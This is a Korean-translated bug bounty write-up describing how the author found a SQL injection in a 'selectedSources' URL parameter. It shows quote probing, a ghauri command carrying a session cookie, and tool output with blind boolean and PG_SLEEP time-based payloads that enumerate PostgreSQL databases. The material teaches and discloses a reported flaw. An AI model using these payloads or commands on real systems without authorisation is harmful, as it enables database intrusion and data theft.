---
title: "첫 번째 유로 보상을 받은 방법"
description: ""
coverImage: "/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png"
date: 2024-06-19 21:16
ogImage: 
  url: /assets/img/2024-06-19-HowIGotMyFirstBounty_0.png
tag: Tech
originalTitle: "How I Got My First €€€€ Bounty"
link: "https://medium.com/@machiavellli/how-i-got-my-first-bounty-65ad8a1763de"
---


안녕하세요!

이 글에서는 어떻게 첫 번째 €€€€ 현상금을 발견했는지에 대해 공유하겠습니다.

처음에는 프로그램 범위가 다양한 서비스와 관련된 URL 집합이었기 때문에 기본 수동 현지 조사로 시작했습니다. 예를 들어:

- https://ex.admin.service.example.com/

<div class="content-ad"></div>

https://ex.service.service.example.com/

https://ex.abc.service.example.com/

또한, 프로그램은 역할을 테스트하기 위한 자격 증명을 제공했습니다.

그런 다음 Burp를 통해 트래픽을 프록시하여 일반 사용자처럼 정렬기능을 제외한 다른 기능을 테스트하면서 사이트를 찾아보았지만, 흥미로운 기능은 없었습니다. 어떤 JS 파일에서 이미 본 흥미로운 매개변수들이 있었다는 것을 알게 되었습니다.

<div class="content-ad"></div>

“SelectedSources, SelectedTemplateNames” 처음에는 아마도 데이터베이스에서 일부 데이터를 가져오는 것인줄 알았어요. 그래서 '“, ‘, \', 와 같은 특수 문자를 입력하여 ' 이상을 찾는 테스트를 해보기로 결정했어요. 하나의 따옴표를 입력하자 500 HTTP 상태 코드(내부 서버 오류)를 받았고, 또 다른 따옴표를 더 추가하니 200 HTTP 상태 코드(정상)를 받았어요.

```js
https://ex.service.example.com/history?selectedSources=someSources' > 500
```

```js
https://ex.service.example.com/history?selectedSources=someSources'' > 200
```

가끔은 역슬래시를 입력하여 확인하기도 해요. 그런데 여기서는 400 안 좋은 요청(Java 앱이었어요)을 받았어요.

<div class="content-ad"></div>

```plaintext
그 후에는 데이터베이스 버전을 추출하기 위해 sqlmap을 실행해 보았지만, 불행히도 sqlmap은 PostgreSQL이 DBMS임을 제외하고는 아무것도 추출하지 못했습니다. 그러나 포기하지 않고 대신 ghauri(https://github.com/r0oth3x49/ghauri.git)를 사용해 보았어요!

ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs

Boom! 🚀
```

<div class="content-ad"></div>

```js
[09:22:32] [INFO] 대상 URL에 대한 연결 테스트 중
Ghauri는 저장된 세션에서 다음 인젝션 지점을 재개했습니다:
매개변수: selectedSources (GET)
    유형: 블라인드 기반 boolean
    제목: OR 블라인드 기반 - WHERE 또는 HAVING 절
    페이로드: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586
    
    유형: 블라인드 기반 시간
    제목: PostgreSQL > 8.1 및 시간 기반 블라인드 (주석)
    페이로드: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586
    
[09:22:33] [INFO] PostgreSQL 테스트 중
[09:22:34] [INFO] PostgreSQL 확인 중
[09:22:34] [INFO] 백엔드 DBMS는 PostgreSQL입니다
[09:22:34] [INFO] 데이터베이스 이름 검색 중
[09:22:34] [INFO] 데이터베이스 수 검색 중
[09:22:51] [INFO] 검색된 결과: 3
[09:26:01] [INFO] 검색된 결과: information_schema
[09:27:51] [INFO] 검색된 결과: pg_catalog
[09:28:57] [INFO] 검색된 결과: public
사용 가능한 데이터베이스 [3]:
[*] pg_catalog
[*] public
[*] information_schema
```

제보했고, 딱 한 시간 만에 트리저가 보고서를 회사에 전달했고, 그들은 취약점을 인정했습니다.

<img src="/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png" />

다음 날, 회사에서 바운티를 수여했습니다.

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-HowIGotMyFirstBounty_1.png)

마지막으로, 이해하지 못하는 도구, 기술 또는 프로그램에만 집착하지 마세요. 그렇게 하면 탈진하게 될 거예요. 이미 인터넷은 취약점으로 가득 찬 곳이니까요.

Twitter/X: https://x.com/MachIaVellill

سَلامٌ
